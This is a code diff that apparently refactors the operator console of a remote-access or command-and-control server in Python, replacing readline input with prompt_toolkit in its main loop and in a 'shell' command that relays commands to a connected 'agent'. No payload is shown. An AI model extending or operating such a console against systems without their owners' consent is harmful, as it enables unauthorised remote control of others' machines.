@@ -3,10 +3,7 @@ import secrets, os, platform, json
 from agent import Agent
 from symbols import *
 import select
-try:
-    import readline  # Linux
-except ImportError:
-    import pyreadline as readline  # Windows
+from prompt_toolkit import PromptSession
 
 class Server:
                                                                       
@@ -155,23 +152,10 @@ class Server:
         threading.Thread(target=self.acceptConnections).start()
 
     def main_loop(self):
-        while True:text(ssl.Purpose.CLIENT_AUTH)
-        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
-
-        print(self.banner)
-        threading.Thread(target=self.acceptConnections).start()
-
-    def main_loop(self):
-        readline.parse_and_bind('tab: complete')
-        readline.parse_and_bind('set editing-mode vi')
+        session = PromptSession()
         while True:
             active_agent = f"[{len(self.agents)} active]" if self.current_agent.id == 0 else f"[Agent {self.current_agent.id}]"
-            try:
-                command = input(f"{active_agent}> ").strip()
-            except KeyboardInterrupt:
-                print("\nExiting...")
-                # TODO exit function here
-                break
+            command = session.prompt(f"{active_agent}> ").strip()
 
             if command:
                 command_name, *args = command.split(' ')
@@ -183,6 +167,7 @@ class Server:
                         self.agent_commands[command_name]['function'](' '.join(args))
                 else:
                     print(f"Unknown command: {command_name}")
+
 
     def exit(self, args):
         self.closeAllConn()
@@ -220,8 +205,9 @@ class Server:
 
     def shell(self, args):
         self.current_agent.sock.sendall("shell".encode())
+        session = PromptSession()
         while True:
-            command = input('$> ').strip()
+            command = session.prompt('$> ').strip()
             if command == '':
                 continue
             if command.lower() == 'exit':
